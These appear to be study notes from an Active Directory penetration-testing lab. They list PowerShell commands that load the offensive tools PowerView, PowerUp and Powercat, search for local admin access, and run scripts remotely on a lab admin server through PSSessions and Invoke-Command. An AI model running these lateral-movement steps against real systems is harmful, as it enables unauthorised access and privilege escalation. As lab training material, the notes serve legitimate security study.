`. .\Powercat.ps1`
`. .\PowerView.ps1`
`Find-LocalAdminAccess`
`$proc = GetProcess`
`$sess = New-PSSession -ComputerName dcorp-admins.dollarcorp.moneycorp.local`
`Enter-PSSession -Session $sess`

`Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock{whoami,hostname}`
`Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath C:\Temp\PowerUp.ps1`

`Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock{$ExecutionContext.SessionState.LanguageMode}`

`help *language*`
`help *mode*`

`. .\Hello.ps1`
`Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock ${function:hello}`
`ls function:`

`$sess`
`Invoke-Command -FilePath C:\Temp\Script.ps1 -Session $sess`
`Enter-PSSession -Session $sess`
`exit`